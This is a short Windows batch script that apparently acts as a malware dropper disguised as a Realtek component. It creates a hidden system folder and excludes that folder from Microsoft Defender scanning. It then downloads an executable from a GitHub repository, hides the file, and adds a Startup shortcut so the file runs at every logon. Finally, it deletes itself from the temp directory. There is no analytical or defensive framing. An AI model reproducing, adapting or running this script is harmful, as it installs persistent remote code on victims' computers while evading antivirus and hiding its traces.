@echo off
mkdir "C:\Program Files (x86)\Realtek"
attrib +s +h +o "C:\Program Files (x86)\Realtek"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Realtek'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/faisalalsharif1/asdasdasd/raw/refs/heads/main/Realtek.exe' -OutFile 'C:\Program Files (x86)\Realtek\Realtek.exe'"
attrib +s +h +o "C:\Program Files (x86)\Realtek\Realtek.exe"
powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Realtek.lnk'); $Shortcut.TargetPath = 'C:\Program Files (x86)\Realtek\Realtek.exe'; $Shortcut.Save()"
del /f /q "%TEMP%\temp.bat"
